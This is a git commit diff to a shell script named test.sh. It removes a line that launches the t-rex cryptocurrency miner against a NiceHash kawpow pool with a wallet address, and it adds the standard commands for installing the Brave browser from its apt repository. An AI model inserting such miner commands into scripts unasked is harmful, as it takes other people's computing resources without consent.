d5aa6e30667e3a2816a15828fd82847a28bcbb91
Alielka0x404 <alielkamili8@gmail.com>
2024-09-16 09:06:14 +0100

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,2 +1,10 @@
 #!/bin/bash
-./t-rex -a kawpow -o stratum+tcp://kawpow.auto.nicehash.com:9200 -u NHbTh5qzS91RGoYPrG8PrLS6pSfvQML4JAHn.MYVNCs -p x 
+sudo apt install curl
+
+sudo curl -fsSLo /usr/share/keyrings/brave-browser-archive-keyring.gpg https://brave-browser-apt-release.s3.brave.com/brave-browser-archive-keyring.gpg
+
+echo "deb [signed-by=/usr/share/keyrings/brave-browser-archive-keyring.gpg] https://brave-browser-apt-release.s3.brave.com/ stable main"|sudo tee /etc/apt/sources.list.d/brave-browser-release.list
+
+sudo apt update
+
+sudo apt install brave-browser
